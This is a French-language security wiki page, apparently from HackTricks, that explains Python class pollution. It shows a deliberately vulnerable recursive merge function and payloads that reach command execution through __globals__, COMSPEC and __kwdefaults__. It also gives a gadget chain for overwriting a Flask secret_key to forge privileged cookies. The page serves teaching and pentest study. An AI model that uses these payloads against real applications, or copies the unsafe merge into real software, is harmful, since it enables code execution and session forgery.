# Class Pollution (Python's Prototype Pollution)

{{#include ../../banners/hacktricks-training.md}}

## Exemple basique

Vérifiez comment il est possible de polluer les classes des objets avec des chaînes de caractères :<sup>[[1]](#references)</sup>
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Exemple de vulnérabilité basique
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Exemples de gadgets

<details>

<summary>Créer une valeur par défaut de propriété de classe pour obtenir une RCE (subprocess)</summary><sup>[[1]](#references)</sup>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Pollution d'autres classes et variables globales via <code>globals</code></summary><sup>[[1]](#references)</sup>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Exécution arbitraire de sous-processus</summary><sup>[[1]](#references)</sup>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Écrasement de <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** est un attribut spécial de toutes les fonctions. D’après la [documentation](https://docs.python.org/3/library/inspect.html) Python, il s’agit d’un « mapping de toutes les valeurs par défaut des paramètres **keyword-only** ». Polluer cet attribut nous permet de contrôler les valeurs par défaut des paramètres **keyword-only** d’une fonction, c’est-à-dire les paramètres de la fonction qui apparaissent après \* ou \*args.<sup>[[1]](#references)</sup>
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Écrasement du secret Flask entre plusieurs fichiers</summary>

Ainsi, si vous pouvez effectuer une class pollution sur un objet défini dans le fichier Python principal de l'application web, mais **dont la classe est définie dans un fichier différent** du fichier principal. En effet, pour accéder à \_\_globals\_\_ dans les payloads précédents, vous devez accéder à la classe de l'objet ou aux méthodes de la classe. Vous pourrez donc **accéder aux globals de ce fichier, mais pas à ceux du fichier principal**. \
Par conséquent, vous **ne pourrez pas accéder à l'objet global de l'application Flask** qui a défini la **secret key** dans la page principale&nbsp;:<sup>[[1]](#references)</sup>
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Dans ce scénario, vous avez besoin d’un gadget pour parcourir les fichiers afin d’atteindre le fichier principal et **d’accéder à l’objet global `app.secret_key`** pour modifier la clé secrète Flask et pouvoir [**escalate privileges** en connaissant cette clé](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload comme celui-ci [tiré de ce writeup](https://ctftime.org/writeup/36082):<sup>[[2]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Utilisez cette payload pour **modifier `app.secret_key`** (le nom dans votre app peut être différent) afin de pouvoir signer de nouveaux cookies Flask dotés de privilèges supplémentaires.

</details>

Consultez également la page suivante pour découvrir davantage de gadgets en lecture seule :


{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## Références

- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)

{{#include ../../banners/hacktricks-training.md}}
